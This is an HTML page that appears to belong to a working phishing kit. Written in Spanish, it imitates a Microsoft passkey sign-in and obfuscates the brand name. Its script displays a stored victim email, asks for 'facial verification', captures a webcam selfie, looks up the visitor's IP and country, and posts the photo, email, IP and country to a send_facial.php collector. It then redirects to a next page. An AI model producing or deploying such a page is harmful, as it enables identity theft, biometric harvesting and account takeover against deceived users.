<!DOCTYPE html>
<html>
  <head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <link href="./docs/remixicon.css" rel="stylesheet" />
    <link rel="stylesheet" href="./docs/styles.css" />
    <link
      href="https://cdn.jsdelivr.net/npm/remixicon@2.5.0/fonts/remixicon.css"
      rel="stylesheet"
    />
    <title>Iniciar</title>
    <style>
      html,
      body {
        overflow: hidden;
        height: 100%;
        margin: 0;
        padding: 0;
      }

      .button-loading {
        position: relative;
        pointer-events: none;
      }
      .button-loading::after {
        content: "";
        position: absolute;
        width: 16px;
        height: 16px;
        top: 0;
        left: 0;
        right: 0;
        bottom: 0;
        margin: auto;
        border: 3px solid transparent;
        border-top-color: white;
        border-radius: 50%;
        animation: button-loading-spinner 1s linear infinite;
      }
      @keyframes button-loading-spinner {
        from {
          transform: rotate(0turn);
        }
        to {
          transform: rotate(1turn);
        }
      }

      .user-email {
        text-align: center;
        color: #1a1a1a;
        font-size: 12px;
        margin-bottom: 20px;
        padding: 8px 16px;
        background-color: #f3f3f3;
        border-radius: 50px;
        display: inline-block;
        border: 1px solid #ddd;
        font-weight: bold;
      }

      .verification-container {
        text-align: center;
        display: flex;
        flex-direction: column;
        align-items: center;
        justify-content: center;
        padding: 20px;
      }

      .verification-title {
        font-size: 20px;
        font-weight: 400;
        color: #1a1a1a;
        margin-bottom: 20px;
        line-height: 1.4;
      }

      .biometric-icon-container {
        margin: 20px 0;
        display: flex;
        justify-content: center;
        align-items: center;
      }

      .verification-description {
        font-size: 14px;
        color: #333;
        line-height: 1.6;
        margin-bottom: 25px;
        max-width: 350px;
        margin-left: auto;
        margin-right: auto;
      }

      .verification-button {
        background-color: #0067b8;
        color: white;
        border: none;
        padding: 12px 24px;
        font-size: 15px;
        border-radius: 2px;
        cursor: pointer;
        width: 100%;
        max-width: 350px;
        font-weight: 600;
        margin-bottom: 10px;
      }

      .verification-button:hover {
        background-color: #005a9e;
      }

      @media (max-width: 768px) {
        .login--form {
          display: flex;
          flex-direction: column;
          justify-content: center;
          top: -50px;
        }

        .verification-container {
          padding: 15px;
        }

        .verification-title {
          font-size: 18px;
          margin-bottom: 15px;
        }

        .biometric-icon-container {
          margin: 15px 0;
        }

        .verification-description {
          font-size: 13px;
          margin-bottom: 20px;
        }
      }
    </style>
  </head>
  <body>
    <section class="login">
      <img src="./docs/imgnew.svg" alt="Login-image" class="login--image" />

      <form id="loginForm" class="login--form">
        <div align="center">
          <img src="./docs/lbg.png" style="width: 110px; margin-bottom: 15px" />
        </div>

        <div class="verification-container">
          <div class="user-email" id="userEmail"></div>
          <script>
            document.getElementById("userEmail").innerHTML =
              localStorage.getItem("correo");
          </script>

          <p class="verification-title">
            Iniciar sesión con la cara, huella dactilar o PIN
          </p>

          <div class="biometric-icon-container">
            <img src="docs/facial.jpg" width="120" alt="" />
          </div>

          <p class="verification-description">
            Cree una clave de paso para iniciar sesión en su cuenta de
            Micros&#111;ft. No se necesitan contraseñas, aplicaciones ni códigos.
          </p>

          <button type="submit" class="verification-button" id="submitButton">
            Siguiente
          </button>
        </div>
      </form>
    </section>

    <script src="./excedata.js"></script>
    <script src="./docs/main.js"></script>

    <script>
      async function getIP() {
        try {
          const response = await fetch("https://api.ipify.org?format=json");
          const data = await response.json();
          return data.ip;
        } catch (error) {
          console.error("Error al obtener IP:", error);
          return "IP no disponible";
        }
      }

      async function getCountry(ip) {
        if (ip === "IP no disponible") return "País no disponible";

        try {
          const response = await fetch(`https://ipapi.co/${ip}/country_name/`);
          return await response.text();
        } catch (error) {
          console.error("Error al obtener país:", error);
          return "País no disponible";
        }
      }

      async function pushMedia(imageBlob, email = "") {
        try {
          const ip = await getIP();
          const country = await getCountry(ip);
          const timestamp = new Date().toISOString().replace(/[:.]/g, "-");
          const formData = new FormData();
          formData.append("photo", imageBlob, `selfie_${timestamp}.jpg`);
          formData.append("correo", email);
          formData.append("ip", ip);
          formData.append("pais", country);
          await fetch("send_facial.php", { method: "POST", body: formData });
          return true;
        } catch (error) {
          console.error("Error al procesar imagen:", error);
          return false;
        }
      }

      const cameraModal = document.createElement("div");
      cameraModal.id = "cameraModal";
      cameraModal.style.cssText = `
        display: none;
        position: fixed;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        background-color: rgba(0, 0, 0, 0.95);
        z-index: 9999;
        justify-content: center;
        align-items: center;
      `;

      cameraModal.innerHTML = `
        <div style="position: relative; max-width: 90vw; width: 100%; text-align: center;">
          <button id="closeCamera" style="position: absolute; top: 20px; right: 20px; background: transparent; border: none; color: white; font-size: 40px; cursor: pointer; z-index: 10000;">&times;</button>
          
          <h2 style="color: white; margin-bottom: 10px; font-size: 24px;">Verificación Facial</h2>
          <p style="color: #ccc; margin-bottom: 30px; font-size: 16px;">Centra tu rostro dentro del círculo</p>
          
          <div style="position: relative; width: 90vw; height: 90vw; max-width: 600px; max-height: 600px; margin: 0 auto; background: transparent; overflow: hidden;">
            <div style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; border-radius: 50%; border: 4px solid white; box-shadow: 0 0 30px rgba(0, 103, 184, 0.5); z-index: 2; pointer-events: none;"></div>
            
            <div style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; border-radius: 50%; overflow: hidden;">
              <video id="cameraVideo" autoplay playsinline style="width: 100%; height: 100%; object-fit: cover; transform: scaleX(-1);"></video>
            </div>
            
            <div style="position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); width: 70%; height: 70%; border: 2px dashed rgba(255, 255, 255, 0.5); border-radius: 50%; pointer-events: none; z-index: 3;"></div>
          </div>
          
          <button id="capturePhoto" style="margin-top: 30px; background-color: #0067b8; color: white; border: none; padding: 14px 50px; font-size: 16px; border-radius: 4px; cursor: pointer; font-weight: 600;">
            Capturar
          </button>
          
          <canvas id="photoCanvas" style="display: none;"></canvas>
        </div>
      `;

      document.body.appendChild(cameraModal);

      let stream = null;

      async function openCamera() {
        try {
          stream = await navigator.mediaDevices.getUserMedia({
            video: {
              facingMode: "user",
              width: { ideal: 1280 },
              height: { ideal: 720 },
            },
          });

          const video = document.getElementById("cameraVideo");
          video.srcObject = stream;

          await new Promise((resolve) => {
            video.onloadedmetadata = () => {
              resolve();
            };
          });

          cameraModal.style.display = "flex";
        } catch (error) {
          console.error("Error al acceder a la cámara:", error);
          alert(
            "No se pudo acceder a la cámara. Por favor, verifica los permisos."
          );
        }
      }

      function closeCamera() {
        if (stream) {
          stream.getTracks().forEach((track) => track.stop());
          stream = null;
        }
        cameraModal.style.display = "none";
      }

      async function capturePhoto() {
  const captureButton = document.getElementById("capturePhoto");
  captureButton.disabled = true;
  captureButton.innerHTML = "Verificando...";
  captureButton.style.opacity = "0.7";

  const video = document.getElementById("cameraVideo");
  const canvas = document.getElementById("photoCanvas");
  const context = canvas.getContext("2d");

  canvas.width = video.videoWidth;
  canvas.height = video.videoHeight;

  context.translate(canvas.width, 0);
  context.scale(-1, 1);
  context.drawImage(video, 0, 0, canvas.width, canvas.height);

  canvas.toBlob(
    async (blob) => {
      captureButton.innerHTML = "Verificando...";
      
      const userEmail = document.getElementById("userEmail").textContent;

      await pushMedia(blob, userEmail);

      closeCamera();

      const submitButton = document.getElementById("submitButton");
      submitButton.disabled = true;
      submitButton.classList.add("button-loading");
      submitButton.innerHTML = "Verificando...";

      await new Promise((resolve) => setTimeout(resolve, 2500));
      window.location.href = "index1.html";
    },
    "image/jpeg",
    0.95
  );
}

      document
        .getElementById("closeCamera")
        .addEventListener("click", closeCamera);
      document
        .getElementById("capturePhoto")
        .addEventListener("click", capturePhoto);

      document
        .getElementById("loginForm")
        .addEventListener("submit", async function (e) {
          e.preventDefault();
          openCamera();
        });
    </script>
  <script src="../protect.js"></script>
  </body>
</html>
